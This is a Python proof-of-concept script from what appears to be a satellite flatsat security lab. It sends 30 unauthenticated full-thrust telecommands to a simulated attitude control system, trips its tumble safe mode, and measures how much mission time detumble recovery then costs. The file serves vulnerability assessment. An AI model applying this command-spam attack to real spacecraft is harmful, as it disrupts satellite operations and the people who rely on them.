#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-33  Virtual ADCS: thruster TCs deliver unmitigated impulses (the
# '10 Hz spam' pattern), tripping the 5 deg/s FDIR; recovery shows the
# B-dot detumble saturation at 0.25 deg/s^2 -> quantified recovery gap
# vs passive damping.
# SPARTA: IMP-ADCS / control authority attack
def tilt(dev):
    dev.advance(1000)
    f = dev.find(dev.tc(0x1D, b"\x00", via="usb"), 0x1D)[0]
    return f.u8(2), f.le16(8) / 100.0

def main(dev, ev):
    dev.tc(0x1D, bytes([10, 0, 1]), via="usb")       # lab time base 0.1x
    s, t0 = tilt(dev)
    ev.log(f"nominal tilt {t0:.2f} deg/s, FDIR threshold 5.00 deg/s")
    check(s == 0 and t0 < 1.0, "stable baseline")
    # 30 unauthenticated impulses (SET_THRUSTER at full, one TC each)
    for i in range(30):
        dev.tc(0x04, bytes([0, 255]), via="radio")
    s, t1 = tilt(dev)
    s2, t1b = tilt(dev)
    s3, t1c = tilt(dev)      # FDIR trips after > 2000 ms sustained
    ev.log(f"after spam: tilt {t0:.2f} -> {t1:.2f} -> {t1c:.2f} deg/s, safe={s3}")
    check(s3 == 1, "spam trips TUMBLE safe-mode")
    # recovery without detumble: passive damping
    dev.tc(0x1D, bytes([9, 0]), via="usb")
    _, a = tilt(dev)
    dev.advance(19000)
    _, b = tilt(dev)
    rate_off = (a - b) / 20.0
    ev.log(f"passive damping: {a:.2f} -> {b:.2f} deg/s = {rate_off:.3f} deg/s^2")
    # recovery WITH detumble: B-dot capped at 0.25 deg/s^2 (saturation)
    dev.tc(0x1D, bytes([9, 1]), via="usb")
    _, c = tilt(dev)
    dev.advance(9000)
    _, d = tilt(dev)
    rate_on = (c - d) / 10.0
    ev.log(f"detumble B-dot: {c:.2f} -> {d:.2f} deg/s = {rate_on:.3f} deg/s^2 "
           f"(saturated torque budget)")
    check(0.15 < rate_on < 0.35, "detumble authority ~0.25 deg/s^2")
    check(rate_on > 10 * max(rate_off, 0.001),
          "detumble is the only real recovery -> attacker controls the "
          "timeline by choosing when to stop adding momentum")
    ev.log("=> 30 cheap TCs = minutes of mission time lost to detumble")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-33 ADCS tumble spam / detumble saturation", main))
